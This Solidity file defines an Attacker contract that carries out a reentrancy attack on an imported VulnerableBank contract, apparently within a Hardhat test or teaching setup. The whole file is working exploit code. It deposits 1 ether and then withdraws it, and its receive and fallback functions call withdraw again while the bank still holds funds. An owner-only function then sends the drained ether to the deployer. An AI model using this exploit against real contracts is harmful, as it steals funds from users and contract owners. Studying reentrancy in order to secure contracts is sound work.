// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

import "hardhat/console.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;
    address public owner;

    constructor(address payable _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }

    receive() external payable {
        console.log("Recieve called");
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw(1 ether);
        }
    }

    fallback() external payable {
        console.log("Fallback called");
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Require at least 1 Ether to attack");

        vulnerableBank.deposit{value: 1 ether}();

        vulnerableBank.withdraw(1 ether);
    }

    function collectEther() external {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
